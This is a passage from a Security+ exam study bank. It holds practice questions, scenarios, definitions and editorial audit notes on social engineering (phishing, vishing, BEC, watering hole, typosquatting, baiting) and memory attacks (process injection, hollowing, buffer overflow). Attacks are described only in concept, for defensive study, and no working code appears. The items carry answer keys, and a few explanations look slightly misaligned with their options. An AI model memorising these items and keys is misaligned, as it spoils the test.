BEC attack — forward the request to finance for processing
Watering hole attack — avoid clicking any links the caller sends
scenarios.exp: Vishing with pretexting: social engineering via voice call. The attacker did reconnaissance to build credibility. The correct response is independent verification — hang up, find the auditor's number from an official statement, and call back.

scenarios.q: A security awareness trainer sends a simulated phishing email about a new benefits portal to all 2,000 employees. 340 click the link; 89 enter credentials. Most clickers are warehouse division employees who rarely use computers. What is the MOST appropriate next action?
opts: Immediately terminate the 89 employees who entered credentials
Deploy SPF and DKIM on the mail server
Implement MFA organization-wide and consider the matter resolved
Provide targeted security awareness training to the warehouse division with role-appropriate examples
scenarios.exp: The simulation identified a specific vulnerable population. MFA is important but doesn't address why they clicked — they need training tailored to their context and how they actually use technology.

scenarios.q: A company's DMARC policy is set to p=none. The security team wants to change it to p=reject, but the IT director warns this could break email from third-party marketing tools. What does p=none mean in practice, and what is the risk of leaving it?
opts: p=none blocks all failing email — it's already the most secure setting
p=none requires SPF but not DKIM
p=none quarantines suspicious email to spam folders
p=none only monitors and reports failures without blocking anything — spoofed email claiming to be from the company's domain is still delivered
scenarios.exp: p=none is monitoring-only — no enforcement. Attackers can still send spoofed email from your domain and it will be delivered. The IT director's concern is valid, but the solution is to fix misconfigured senders and move to p=quarantine then p=reject.

scenarios.q: Employees at a hospital begin receiving texts claiming the payroll portal requires immediate password reset due to a 'security incident.' Two employees reset their passwords on the fake site. What is the IMMEDIATE priority for the security team?
opts: Pharming attack — flush the DNS cache on the local resolver and notify the network team
Spear phishing — identify which executives were targeted and reset their passwords
Vishing attack — block the originating phone number and notify the telco fraud team
Smishing attack — immediately reset the two compromised passwords and enable MFA
scenarios.exp: Immediately reset the compromised credentials and enable MFA on those accounts, then investigate what was accessed. Smishing (SMS phishing). Immediate priority is containing the damage: reset the two compromised accounts, force MFA, and check for any access using those credentials before the security team arrived. Stopping active harm precedes investigation.

cram.def: Creating a fabricated scenario (pretext) to manipulate a victim. 'I'm from IT, I need your password.'
Fake websites, emails, or apps mimicking trusted brands (Microsoft, Apple, banks) to steal credentials.
Attacker impersonates an executive via email to trick employees into wire transfers or credential disclosure.
Registering domain names similar to legitimate ones (gooogle.com) to catch mistyped URLs.
Using stolen personal information to impersonate someone for financial gain or access.

matching.prompt: Fabricating a scenario to extract information
Fake Microsoft login page to steal credentials
Posing as an executive via email for wire transfer
Domain gooogle.com registered to catch typos

questions.q: Pretexting involves:
opts: Sending malicious email attachments to a broad list of harvested email targets
Cracking encrypted passwords offline using a captured password hash
Installing keyloggers remotely on the victim's compromised endpoint workstation
Fabricating a believable scenario to manipulate a victim into providing information or access
questions.exp: Pretexting creates a believable false context — the attacker plays a role to make the manipulation seem legitimate.

questions.q: Business Email Compromise (BEC) attacks primarily target:
opts: Executives and finance staff to authorize fraudulent wire transfers or reveal credentials
Personal email accounts of low-ranking employees to harvest reusable credentials
Network infrastructure devices to deploy persistent command-and-control backdoors
Web application databases via SQL injection through unauthenticated contact forms
questions.exp: BEC impersonates executives via email to manipulate employees — often resulting in large fraudulent wire transfers.

questions.q: Typosquatting involves:
opts: Injecting malicious code into legitimate websites visited by victims
Spoofing email sender addresses to bypass DMARC enforcement at the recipient
Registering domain names similar to legitimate ones to catch users who mistype URLs
Cloning RFID access badges to bypass physical building access controls
questions.exp: Typosquatting registers slightly misspelled versions of popular domains — capturing misdirected traffic.

scenarios.q: A new employee receives a call from 'IT helpdesk' saying there's a critical security issue with their laptop and asking them to install a remote access tool. The employee didn't report any issue. What attack is this, and what should the employee do?
opts: A legitimate IT helpdesk call — install the tool as instructed
A vishing attack seeking to install ransomware — report to the police immediately
A quid pro quo social engineering attack — hang up and verify by calling the IT helpdesk directly using the number from the company intranet
A baiting attack — the 'tool' is a USB drive the attacker will mail later
scenarios.exp: Quid pro quo: attacker offers IT help in exchange for the employee installing remote access software. Verify independently — hang up and call IT using a number from a trusted internal source, not one the caller provides.

scenarios.q: A financial institution's customers are being redirected to a fake banking site even when they type the correct URL directly into the browser. The institution's own DNS records appear correct. What is MOST likely occurring?
opts: The institution's SPF record is misconfigured, allowing spoofed emails
Pharming — the attacker has poisoned a widely-used upstream DNS resolver's cache
A typosquatting attack targeting customers who misspell the URL
An SSL stripping attack downgrading customer connections to HTTP
scenarios.exp: Pharming via DNS cache poisoning — the correct URL is being typed but a compromised resolver is returning a malicious IP. The institution's own DNS records being correct rules out domain hijacking.

scenarios.q: The CEO posts on LinkedIn that she is attending a conference in Singapore next week. Three days later, the CFO receives an email from the CEO's personal email requesting he authorize an emergency $80,000 gift card purchase for a client deal that must close before the CEO returns. What attack is this, and what control would MOST directly prevent it?
opts: Spear phishing via email — SPF on the CEO's personal Gmail would have rejected the spoofed message at the inbound gateway
Vishing pretending to be the CEO — call-line authentication on the corporate VOIP system would block any spoofed caller IDs
BEC/whaling exploiting public OSINT — a callback verification policy requiring voice confirmation for financial requests above a threshold
Supply chain attack through the conference organizer — auditing the organizer's email system would have prevented this
scenarios.exp: Whaling/BEC using OSINT: the LinkedIn post provided the travel window. The CEO's personal email can't be controlled by corporate SPF. The control that matters is a human process: any financial request above threshold requires a live voice callback using a known number.

scenarios.q: Threat intelligence reveals attackers have registered 'microsofft.com', 'rniicrosoft.com', and 'microsoft-security-alert.com' — all hosting convincing Microsoft login pages. What technique is being used, and which population is MOST at risk?
opts: Typosquatting and brand impersonation
DNS poisoning — all internet users
Watering hole attacks — Microsoft employees specifically
BGP hijacking — enterprise customers with direct Microsoft connections
scenarios.exp: Users who mistype Microsoft's URL or click links without checking the full domain. Typosquatting (microsofft, rniicrosoft) catches fast typists. Brand impersonation (microsoft-security-alert.com) catches users who click links in emails without inspecting the full URL. Users who carefully verify domains before entering credentials are protected.

scenarios.q: An attacker spends two weeks building rapport with a target company's IT administrator on a professional networking site, posing as a cybersecurity consultant. After establishing trust, they send the admin a 'security assessment tool' to run on the network — actually a backdoor. What social engineering principle is being exploited?
opts: Scarcity — the attacker created urgency to act quickly
Authority — posing as a cybersecurity expert
Intimidation — threatening professional consequences for non-compliance
Liking — building genuine rapport before the malicious request to reduce scrutiny
scenarios.exp: Liking: people lower their defenses and comply more readily with people they like. Two weeks of rapport-building is deliberate — it makes the malicious request feel like a favor to a friend rather than a suspicious request from a stranger.

cram.def: Attacker compromises a website frequently visited by the target group. Victims infect themselves by visiting a site they trust.
Users trust their regular sites. Doesn't require direct contact with victims. Hard to detect before infection.
Another name for watering hole attack — compromising strategically chosen sites.
Patch browsers/plugins promptly. Web content filtering. Threat intelligence feeds. Network monitoring.

matching.prompt: Compromising a site frequented by the target group
Why victims don't suspect the attack
matching.answer: They trust the site they're visiting

matching.prompt: Another name for a watering hole attack

questions.q: A watering hole attack involves:
opts: Flooding a server with traffic to cause denial of service
Compromising a website frequently visited by the target group to infect their systems
Intercepting network traffic with a MITM attack
Sending targeted phishing emails to specific individuals
questions.exp: Watering hole attacks compromise sites the target regularly visits — the attacker waits for victims to come to them.

questions.q: Why are watering hole attacks difficult to detect before infection?
opts: The compromised site appears legitimate and is one the victim already trusts
They target only government systems
They exclusively use zero-day exploits
They always use encrypted communication
questions.exp: Victims have no reason to distrust a familiar, legitimate-looking site — the malicious code is hidden within it.

questions.q: A threat actor wants to target engineers at an energy company. They compromise a popular ICS/SCADA industry news website. This is:
opts: A watering hole attack
Brand impersonation
Spear phishing attack
A supply chain attack
questions.exp: Compromising an industry site frequented by the target group — waiting for them to visit — is a watering hole attack.

scenarios.q: An attacker wants to target engineers at a specific aerospace company without sending any direct communications. They research which industry forums and technical news sites the engineers regularly visit, then compromise one of those sites by injecting malicious JavaScript that exploits a browser vulnerability. Three weeks later, four engineers' workstations are compromised. What attack technique was used?
opts: Spear phishing campaign targeting the engineers directly
Watering hole attack — compromising sites the target group frequents rather than contacting targets directly
Supply chain attack on the engineering software vendor
Baiting attack using USB drives left at the conference
scenarios.exp: Watering hole: the attacker never contacted the targets. They compromised trusted sites the targets visit — exploiting the target's own browsing behavior. The engineers had no reason to distrust their regular professional resources.

scenarios.q: A financial firm's SOC detects malware on three analyst workstations. All three visited a well-known financial regulation news website last Tuesday. The website appears legitimate and is still online. Threat intel confirms the site was briefly compromised with a malicious iframe last Tuesday afternoon. What MOST directly would have prevented the infection?
opts: Ensuring browser and PDF reader plugins were fully patched — the exploit targeted an unpatched browser vulnerability
Deploying a network IDS to alert on the malicious iframe — flagging the traffic for analyst review
Blocking the financial regulation website entirely — adding it to the corporate proxy's category-deny list
Implementing DMARC on the company's email domain — rejecting spoofed inbound messages from outside
scenarios.exp: Watering hole attacks exploit client-side vulnerabilities. Fully patched browsers often survive watering hole attempts because the exploits target specific known CVEs. Blocking the site wasn't possible in advance. Network IDS alerts but doesn't prevent.

scenarios.q: A red team is tasked with compromising a government agency. Direct phishing is detected and blocked by their email gateway. The red team identifies three external contractor websites that agency staff regularly use for project collaboration and compromises one. Which offensive technique is this?
opts: Spear phishing via a third-party email system
Typosquatting the contractor's website
Supply chain attack through the contractor's software
Strategic web compromise / watering hole
scenarios.exp: Compromising a site the target visits rather than attacking the target directly. Strategic web compromise is another term for watering hole attack. The red team adapted when direct phishing failed — pivoting to indirect compromise via a trusted resource. Browser patching and endpoint protection were the required defenses.

cram.def: Using enticing physical media (USB drives) or fake offers to lure victims into executing malware.
Following an authorized person through a secured door without authenticating. Physical access attack.
'Something for something.' Attacker offers help (IT support) in exchange for information or access.
Creating urgency — 'act now, limited time.' Bypasses critical thinking.
Impersonating a figure of authority (boss, IT, government) to compel compliance.
Deliberately spreading false information. Distinguished from misinformation which is unintentional.

matching.prompt: USB drives left in a company car park
Following someone through a badge-entry door
'I'll fix your computer if you give me your password'
'Act now — offer expires in 1 hour!'
'I'm from corporate IT — do this immediately'
Deliberately spreading false information at scale

questions.q: An attacker leaves infected USB drives in a company car park. This is:
opts: Tailgating
Vishing
Pretexting
Baiting
questions.exp: Baiting uses enticing physical media or offers to lure victims — the USB drive triggers malware execution when inserted.

questions.q: Which social engineering principle does 'Act now — this offer expires in 1 hour!' exploit?
opts: Authority
Scarcity
Social proof
Liking
questions.exp: Scarcity creates artificial urgency — pressure to act immediately reduces critical thinking and victim scrutiny.

questions.q: Following an authorized person through a badge-access door without using your own credentials is:
opts: Piggybacking/tailgating
Vishing
Pretexting
Eliciting
questions.exp: Piggybacking/tailgating physically follows an authorized person through a controlled access point without authenticating.

questions.q: Which BEST distinguishes disinformation from misinformation?
opts: Disinformation is deliberately false content created with intent to deceive; misinformation is false content spread by people who believe it is true (no malicious intent)
The two terms are interchangeable in standard usage and refer to the same phenomenon of false content circulating online
Disinformation appears only in printed media while misinformation is exclusively a social-media phenomenon spread by ordinary users
Disinformation is published only by state-sponsored actors while misinformation is shared only by individual social-media users
questions.exp: The defining axis is intent. Disinformation is deliberately false — created and propagated by an actor (state, corporate, political) who knows it is false and seeks to deceive an audience for advantage. Misinformation is false content spread by people who genuinely believe it is true; the false claim still propagates but no deceit is intended. The terms are NOT interchangeable; medium and actor type are not the defining axis. The distinction matters operationally — countering disinformation requires attribution and source disruption, while countering misinformation requires factual correction and media literacy.

questions.q: Which control MOST effectively mitigates social engineering attacks?
opts: Network firewall rules at the perimeter edge
Security awareness training for all employees
Network intrusion detection systems on the LAN
Stronger encryption of data at rest on endpoints
questions.exp: Social engineering targets people — technical controls don't stop it. Training employees to recognize and report attempts is the primary mitigation.

scenarios.q: An attacker calls reception, claims to be from their IT vendor, and says there's a critical network issue requiring immediate server room access. The receptionist escorts them in without checking identity. Once inside, the attacker installs a keylogger on an unlocked workstation. What TWO attack techniques were used?
opts: Impersonation/pretexting to gain physical access, and a physical keylogger installation once inside
Vishing pretext over the phone and DLL injection of a remote process on the receptionist's PC
Tailgating silently through the lobby door and ARP poisoning of the conference room LAN
Baiting with a malicious USB drop in the parking lot and a watering hole attack on a vendor site
scenarios.exp: Two techniques: (1) impersonation with pretexting — claiming to be IT vendor to gain access; (2) physical keylogger installation once inside. Visitor verification procedures and a clean desk/screen lock policy would have mitigated both.

scenarios.q: A security awareness test sends: 'FINAL NOTICE: Your email account will be permanently deleted in 2 hours unless you click here.' 28% of employees click. Which social engineering principle made this test so effective?
opts: Authority — the email appeared to come from IT
Liking — the email used friendly, familiar language
Social proof — employees assumed colleagues had already clicked
Scarcity and urgency — the artificial time pressure bypassed critical thinking
scenarios.exp: Scarcity/urgency: '2 hours' and 'permanent deletion' create panic that overrides careful evaluation. Training should specifically focus on recognizing artificial urgency as a manipulation tactic — legitimate IT departments don't delete accounts on 2-hour notice.

scenarios.q: An employee finds a USB drive in the company car park labeled 'Salary Review 2024 - CONFIDENTIAL'. They plug it in at their workstation. The drive executes a script that installs malware. Which social engineering attack is this, and what combination of controls MOST effectively prevents it?
opts: Shoulder surfing — security cameras and privacy screens
Tailgating — mantrap and badge access at entrance
Baiting — USB port disable policy via endpoint management AND security awareness training about found media
RFID cloning — Faraday cage around workstations
scenarios.exp: Baiting exploits curiosity and greed. Two controls needed: technical (disable USB ports via MDM/endpoint policy) AND human (train employees that found media is a known attack vector — turn it in to IT, don't plug it in). Either alone is insufficient.

audit_d_review.note: accept-alternate target equals current citation; treated as kept-as-is via self-alternate (no edit applied)

scenarios.q: A disgruntled ex-employee tells a journalist that the company's security practices are dangerously inadequate and provides fabricated 'evidence' — fake internal memos and manufactured screenshots. The story goes viral and damages the company's stock price. What type of attack is this?
opts: An insider threat — data exfiltration for financial gain
A supply chain attack through media publication
A hacktivist attack — ideologically motivated public disclosure of real vulnerabilities
A disinformation campaign — deliberately spreading false information to cause harm
scenarios.exp: Disinformation: the information is deliberately fabricated. The goal is reputational and financial harm through false narrative. This differs from a whistleblower (real information) or misinformation (false but not deliberately so).

scenarios.q: An attacker calls an employee claiming to be from their health insurance provider, saying the employee has an unpaid claim that could affect their coverage — but they need to 'verify' the employee's SSN and date of birth first. The employee, worried about their coverage, provides the information. What principle is being exploited?
opts: Authority combined with fear — impersonating a legitimate authority and threatening a negative personal consequence
Scarcity — the threat of losing health coverage creates urgency
Social proof — implying other employees have already verified
Liking — the attacker built rapport before asking
scenarios.exp: Authority (impersonating insurance provider) combined with fear of personal harm (losing coverage) is a powerful combination. The threat is personal and health-related — employees' critical thinking is bypassed by emotional response. Train employees to call companies back using numbers from official statements.

questions.q: Greg believes that an attacker may have installed malicious firmware in a network device before it was provided to his organization by the supplier. What type of threat vector best describes this attack?
opts: Supply chain
Removable media
Cloud
Direct access
questions.exp: Tampering with equipment before it reaches the intended user is an example of a supply chain threat. It is also possible to describe this attack as a direct access attack because it involved physical access to the device, but supply chain is a more relevant answer.

questions.q: Of the threat vectors shown here, which one is most commonly exploited by attackers who are at a distant location?
opts: Email
Direct access
Wireless
Removable media
questions.exp: Email is the most common threat vector exploited by attackers who use phishing and other social engineering tactics to gain access to an organization. The other vectors listed here, direct access, wireless, and removable media, all require physical proximity to an organization and are not easily executed from a remote location.

questions.q: Joseph receives an email notifying him that he needs to change his password due to a recent account issue. He notices that the email links him to a website using the domain amaz0n.com. What type of attack should he describe this as?
opts: Typosquatting
Phishing
Smishing
A watering hole attack
questions.exp: This email is an attempt to get account information and is a phishing email. Joseph did not enter the URL himself, which is the behavior that a typosquatter relies on. A smishing attack relies on SMS, and a watering hole attack uses a frequently visited website.
questions.framing_note: The lookalike domain `amaz0n.com` is a textbook typosquat, and a Messer-style instinct might pick "Typosquatting." Sybex (and the exam) categorise this by the *initiation channel*: an email arrives unsolicited, asking the user to act on a link — that is phishing. Typosquatting is the *technique* used inside the phishing email (the lookalike URL); it isn't the attack class. On the exam, when an email initiates the contact, lead with phishing/spear-phishing/whaling and treat typosquat-style URLs as one of phishing's tools.

questions.q: Which of the following human vectors is primarily associated with nation‐state actors?
opts: Misinformation campaigns
Watering hole attacks
Business email compromise
Password spraying
questions.exp: Misinformation and disinformation campaigns are primarily associated with nation‐state actors, but are increasingly used by other organizations and even individuals as well. Watering hole attacks, business email compromise, and password spraying are broadly used attacks.

questions.q: Nicole accidentally types www.smazon.com into her browser and discovers that she is directed to a different site loaded with ads and pop‐ups. Which of the following is the most accurate description of the attack she has experienced?
opts: DNS hijacking
Pharming
Typosquatting
Hosts file compromise
questions.exp: Typosquatting uses misspellings and common typos of websites to redirect traffic for profit or malicious reasons. Fortunately in reality, if you visit smazon.com, you’ll be redirected to the actual amazon.com website, as Amazon knows about and works to prevent this type of issue. DNS hijacking and hosts file modifications both attempt to redirect traffic to actual URLs or hostnames to different destinations, and pharming does redirect legitimate traffic to fake sites, but typosquatting is the more specific answer.

questions.q: Devon is a penetration tester and sets up malicious tools on his target organization’s primary internal website. What type of attack is he conducting?
opts: A misinformation campaign
A watering hole attack
A typosquatting attack
A disinformation campaign
questions.exp: Devon is conducting a watering hole attack that leverages a frequently visited site to deploy malware. There is no description of misinformation or disinformation in the question, and there is not a typo described that would lead to a typosquatting attack being successful.

questions.q: Phishing emails sent pretending to be from a company that recipients are familiar with and likely to respond to is what type of attack?
opts: Phishing
Pharming
Brand impersonation
Pretexting
questions.exp: Brand impersonation attacks are designed to appear to be from a company that recipients are likely to be familiar with, and thus are more likely to elicit a response. While these are a type of phishing, the more specific answer of brand impersonation is the best answer. Pretexting is a social engineering concept that provides a reason for the request. Pharming attacks redirect traffic intended to be sent to a legitimate site to a fake website typically designed to simulate the real one.

questions.q: When a caller was recently directed to Amanda, who is a junior IT employee at her company, the caller informed her that they were the head of IT for her organization and that she needed to immediately disable the organization’s firewall. After Amanda made the change, she discovered that the caller was not the head of IT, and that they were actually a penetration tester hired by her company. What social engineering attack best describes this?
opts: Smishing
Pretexting
Impersonation
Vishing
questions.exp: This is an example of an impersonation attack. The pentester impersonated the head of IT in order to achieve their goals. The good news is that it was a penetration tester! Smishing is phishing via SMS, vishing is phishing via voice or voicemail, and pretexting provides a reason that the target should perform an action. Here the attack relied on the authority that Amanda believed the caller had.

questions.q: Fred is concerned about text message–based attacks. Which of the following attacks relies on text messages as its primary focus?
opts: Impersonation
Watering hole attacks
Smishing
Business email compromise
questions.exp: Smishing attacks are SMS‐based. Impersonation attacks could use texts but don’t specifically rely on them. Watering hole attacks use frequently visited websites, whereas business email compromise attacks focus on gaining access to business email accounts to use in follow‐up attacks.

questions.q: Naomi receives a report of smishing. What type of attack should she be looking for?
opts: Compressed files in phishing
Text message–based phishing
Voicemail‐based phishing
Server‐based phishing
questions.exp: Smishing is a type of phishing that occurs via text (SMS) message.

questions.q: Jack’s organization wants to prevent typosquatting. What option should he select to address this issue?
opts: Copyright the domain name
Purchase the most common typos for his organization’s domain
Trademark the domain name
Disable typo resolution for the domain
questions.exp: While it’s nearly impossible to prevent typosquatting, purchasing and registering the most common typos (typo‐domains) related to your organization’s domain and redirecting them to your real domain is the most effective option available. Copyrighting or trademarking the domain name does not prevent typosquatting, and typo resolution is not a feature or capability that is available.

questions.q: Gwyne’s company has been contacted by customers asking about a new social media account operating under the company’s brand. The social media account is advertising cryptocurrency, which Gwyne’s organization does not sell or work with. What type of attack best describes what Gwyne’s organization has encountered?
opts: Impersonation
Brand impersonation
Mis‐branding
Crypto‐phishing
questions.exp: Using an organization’s brand in this way is an example of brand impersonation. While this is also an impersonation attack, the more specific description is the best answer here. Misbranding and crypto‐phishing were both made up for this question and aren’t commonly used terms.

questions.q: When you combine phishing with voicemail, it is known as:
opts: Whaling
Spoofing
Spooning
Vishing
questions.exp: Vishing is a form of phishing done via voice phones call or voicemail. Whaling focuses on targeting important targets for phishing attacks, whereas spoofing is a general term that means faking things. Spooning is not a technical term used for security practices.

questions.q: Nation‐state‐driven social media campaigns about the trustworthiness of the U.S. election in 2016 are an example of what type of social engineering?
opts: Smishing
Pretexting
Disinformation
Spraying
questions.exp: Disinformation campaigns are used to shift public opinion or to accomplish other goals. They are not limited to nation‐state actors but are an increasingly heavily used social engineering tactic at a broad scale. Smishing relies on SMS messages, pretexting involves using a reason that creates urgency or importance in a request from a social engineer, and spraying is a type of password brute forcing.

questions.q: One of the staff at Susan’s organization has reported that a critical vendor has contacted them about an unpaid invoice. After Susan investigates, she discovers that the invoice was sent from an email account that was not typically a contact and that the invoice requested payment to a PayPal account. What type of social engineering attack has Susan most likely discovered?
opts: Smishing
Business email compromise
Disinformation
Typosquatting
questions.exp: Susan has most likely discovered a business email compromise and should reach out to the impacted organization to inform them of the potentially compromised account. Smishing would occur via SMS, there is nothing in the question to indicate a disinformation campaign was part of this, and there is no URL mentioned and thus typosquatting can be dismissed as well.

questions.q: Selah infects the ads on a website that users from her target company frequently visit with malware as part of her penetration test. What technique has she used?
opts: A watering hole attack
Vishing
Whaling
Typosquatting
questions.exp: Watering hole attacks rely on compromising or infecting a website that targeted users frequently visit, much like animals will visit a common watering hole. Vishing is phishing via voice, whaling is a targeted phishing attack against senior or important staff, and typosquatting registers similar URLs that are likely to be inadvertently entered in order to harvest clicks or conduct malicious activity.

questions.q: Melissa receives a call and the caller informs her a senior manager in her organization needs her to buy gift cards for an event that starts in an hour. The caller says that the senior leader forgot to get the cards, and that the event is critical to her organization. Melissa buys the cards and sends them to the Gmail address the caller says that the senior leader needs them sent to. What type of attack has Melissa fallen for?
opts: Phishing
Pretexting
Business email compromise
Carding
questions.exp: The caller is using pretexting, providing Melissa with a story that relies on urgency and perceived authority to get her to take actions she might normally question. This social engineering attack is not a phishing attack aimed at gathering information or credentials, it does not involve business email accounts being compromised, and carding is not a topic covered in the Security+ exam outline.

questions.q: Madhuri disables SMS, MMS, and RCS on phones in her organization. What has she prevented from being sent?
opts: Phone calls and texts
Text messages and multimedia messages
Text messages and firmware updates
Phone calls and multimedia messages
questions.exp: SMS (Short Message Service) is used to send text messages, and MMS and RCS provide additional multimedia features. Neither provides phone calls or firmware updates.

questions.q: Madhuri receives a text message asking her to contact the IRS due to unpaid taxes. When she calls the number in the text message, the person on the other end of the line attempts to get her to disclose her bank account number, Social Security number, and other personal information. What type of attack is this?
opts: Vishing
Phishing
Spearphishing
Smishing
questions.exp: Smishing is phishing over SMS or text messages. Phishing is typically done via email, whereas vishing is conducted via the phone. Spearphishing is done via email and specifically targeted at individuals or small groups.

questions.q: Henry is conducting a penetration test and wants to social‐engineer a staff member at his target organization into letting him gain access to a building. He explains that he is there at the request of a senior manager, and that he is late for a meeting with that manager, who is relying on him to be there. What social engineering principle is he using?
opts: Authority
Intimidation
Urgency
Trust
questions.exp: Henry is using urgency. If he has expressed the fact that the person could lose their job if they didn’t let him in, he might intimidate them. If he had told them that he was an inspector or enforcement officer, he would have been using perceived authority. Finally, if he exploited their willingness to trust him, he would have used that trust as the foundation of his social engineering attack.

questions.q: Abigail’s organization has had a number of users report that their systems were infected with malware after visiting a site belonging to a local business that staff members visit frequently. What type of attack has Abigail’s organization most likely suffered from?
opts: Credential harvesting
A watering hole attack
Whaling
Pretexting
questions.exp: A watering hole attack focuses on redirecting a commonly used website to a malicious site. Credential harvesting attacks can use many different techniques to acquire credentials. Whaling is phishing targeting specific important users, and pretexting is a social engineering technique that provides an excuse for why a person is conducting an activity or needs specific access.

questions.q: Lucca’s staff has received a text message with a link claiming to be to their annual performance review from HR. Lucca knows that the HR department does not send out performance reviews via text. What type of social engineering attack has Lucca’s organization most likely been targeted by?
opts: A phishing attack
A vishing attack
A smishing attack
A whaling attack
questions.exp: Smishing attacks are sent via text message or SMS. Vishing attacks are done by voice or voicemail, and phishing is a general term for attacks that attempt to gain credentials or sensitive information through human interaction. A whaling attack focuses on important individuals in an organization.

questions.q: Which of the following is the least likely to be a threat created by having an unsecured wireless network?
opts: Intercepting unencrypted data
Spoofing the SSID to conduct an on‐path attack
Distributed denial‐of‐service attacks
Undesired access by third parties
questions.exp: Unsecure wireless can lead to unencrypted data being intercepted, spoofing of the SSID resulting in an on‐path attack or access by third parties. Not securing Wi‐Fi is less likely to result in a denial‐of‐service (DoS) attack, and a distributed denial‐of‐service (DDoS) attack is even less likely.

cram.def: Inserting malicious code into the memory space of a running process to execute with that process's privileges.
Forcing a process to load a malicious DLL. The malicious code runs with the process's privileges.
Creating a legitimate process in suspended state, removing its code from memory, replacing with malicious code.
Address Space Layout Randomization. Randomizes memory locations — hindering exploitation.
Data Execution Prevention. Prevents code executing in data memory regions.

matching.prompt: Forcing a process to load a malicious library
Replacing legitimate process code with malicious code
Randomizes memory addresses to hinder exploitation
Prevents code execution in data memory regions

questions.q: DLL injection is a technique used to:
opts: Force a running process to load and execute a malicious library within its address space
Encrypt sensitive data in process memory at rest in the swap
Extract user passwords from the operating system credential store
Intercept network traffic between processes via shared kernel memory
questions.exp: DLL injection forces a legitimate process to load a malicious DLL — the malicious code then runs with the process's privileges.

questions.q: Process hollowing involves:
opts: Creating a legitimate process, suspending it, and replacing its code with malicious code
Deleting all suspicious processes on the system during boot-up
Encrypting all process memory pages at runtime to prevent inspection
Hijacking a running process by injecting code into its open file handles
questions.exp: Process hollowing creates a trusted process 'shell' and fills it with malicious code — the OS sees a legitimate process name.

questions.q: ASLR mitigates memory attacks by:
opts: Encrypting all process memory pages at rest in the operating system kernel
Preventing code execution in memory regions specifically designated for data
Monitoring all memory allocation requests by running user processes in real time
Randomizing where processes, libraries, and stacks are loaded — making buffer overflows harder to exploit
questions.exp: ASLR randomizes memory locations — making buffer overflows and memory injection harder to exploit reliably.

questions.q: DEP (Data Execution Prevention) mitigates memory attacks by:
opts: Encrypting executable code in memory to prevent disassembly
Monitoring memory usage and allocation in real time
Randomizing memory addresses to prevent address prediction
Preventing code from executing in memory regions designated for data storage
questions.exp: DEP marks certain memory regions as non-executable — preventing attackers from running shellcode injected into data areas.

scenarios.q: An EDR alert shows that svchost.exe — a legitimate Windows system process — has spawned an unexpected child process and established an outbound connection to an external IP. The svchost.exe file hash shows no anomalies. What technique is MOST likely being used?
opts: A buffer overflow exploiting the svchost.exe binary
A macro virus attached to svchost.exe
A rootkit modifying the Windows kernel
Process injection
scenarios.exp: Malicious code injected into svchost.exe's memory space so it runs under the trusted process's identity. Process injection: malicious code is running inside the legitimate svchost.exe process. The EDR sees svchost.exe making the connection — which is less suspicious than an unknown process. The file hash is clean because the executable itself wasn't modified; the malicious code was injected at runtime.

scenarios.q: A developer discovers their C application allocates a fixed 512-byte buffer for user input but doesn't validate input length. An attacker submits 600 bytes of crafted input. The application crashes and the developer finds the return address on the stack was overwritten. What vulnerability is this, and what is the PRIMARY mitigation?
opts: SQL injection — use parameterized queries
Stack-based buffer overflow
Race condition — implement mutex locking
Integer overflow — use unsigned integer types
scenarios.exp: Implement bounds checking and input length validation, with OS-level mitigations (ASLR, DEP, stack canaries) as defense-in-depth. Stack buffer overflow: user input exceeded the allocated buffer, overwriting the return address. Primary mitigation is the root cause fix: validate input length before writing to the buffer. ASLR, DEP, and stack canaries make exploitation harder but don't fix the vulnerable code.

scenarios.q: A forensic analyst finds a legitimate antivirus process has an unusual thread not present in the baseline. Memory forensics reveals shellcode running within the antivirus process's address space. The antivirus binary's file integrity checks show no tampering. How was the attacker likely able to execute code while evading detection?
opts: Thread injection — the attacker injected shellcode into an existing thread of the antivirus process, running malicious code under its trusted identity
The attacker replaced the antivirus binary with a stealthier version that mimics file-integrity hashes
The antivirus had an unpatched buffer overflow vulnerability that was exploited to gain code execution
The attacker used a kernel-mode rootkit to hide an additional malicious process spawned by the antivirus
scenarios.exp: Thread injection: shellcode was injected into an existing thread of the antivirus process. The AV binary itself is untampered (file integrity checks pass). Security tools often trust their own process, making injection into AV a particularly effective evasion technique.

scenarios.q: A penetration tester launches calc.exe in a suspended state, uses WriteProcessMemory to replace its code with a custom payload, then resumes the process. Task Manager shows calc.exe running. What technique is this, and why is it effective?
opts: DLL injection — effective because DLLs are loaded by all processes
ASLR bypass — effective because it randomizes memory addresses
Process hollowing — effective because the process name and PID appear legitimate while executing malicious code
A rootkit — effective because it modifies the Windows kernel
scenarios.exp: Process hollowing: a legitimate process shell is created, its code replaced with malicious code, and it's resumed. Task Manager shows 'calc.exe'. Allow-listing solutions that whitelist processes by name are bypassed because calc.exe IS whitelisted — the hollowing happens after launch.

cram.def: Writing more data to a buffer than it can hold — overwriting adjacent memory, potentially redirecting execution.
Random value placed before the return address on the stack — if it changes, a buffer overflow is detected.
Arithmetic result exceeds the maximum value a variable can hold — wraps around to unexpected value.

audit_d_review.note: Integer overflow concept absent from entire Messer SY0-701 corpus (verified via grep across 122 transcripts, 2026-05-21). Buffer Overflows is the closest sibling video but not the conceptual home — buffer-overflow umbrella (memory-write-beyond-bounds) does NOT subsume integer-overflow (arithmetic-exceeds-type-range); distinct concepts sharing only the word 'overflow'. SB-fix-2 to decide: re-cite to nearest survey video (2.3 - Other Application Attacks?), rewrite item to test buffer overflow specifically, or flag for removal as out-of-Messer-scope.

sb_fix_2.note: Sybex frames integer overflow as a buffer-overflow variant (storage-size implication) rather than the general arithmetic-wraparound framing the current cram/match uses. Both correct; framing alignment is a future content-quality consideration, not a blocker.

cram.def: Unsafe functions (strcpy, gets) that don't check input length. Common in C/C++ code.

Random value before return address to detect overflow
Arithmetic result exceeds variable maximum

SB-fix-2 to decide: re-cite to nearest survey video (2.3 - Other Application Attacks?), rewrite item to test buffer overflow specifically, or flag for removal as out-of-Messer-scope.

sybex_reference.quote_excerpt: One of the listed vulnerabilities is an 'Integer overflow'. This is simply a variant of a buffer overflow where the result of an arithmetic operation attempts to store an integer that is too large to fit in the specified buffer.

sb_fix_2.note: Sybex frames integer overflow as a buffer-overflow variant (storage-size implication) rather than the general arithmetic-wraparound framing the current cram/match uses. Both correct; framing alignment is a future content-quality consideration, not a blocker.

matching.prompt: Common C functions causing buffer overflows

audit_d_review.note: strcpy/gets/sprintf; 2.3 Buffer Overflows IS umbrella; specific C functions are mechanism implementations.

sybex_reference.quote_excerpt: more data is put into a buffer than it can hold

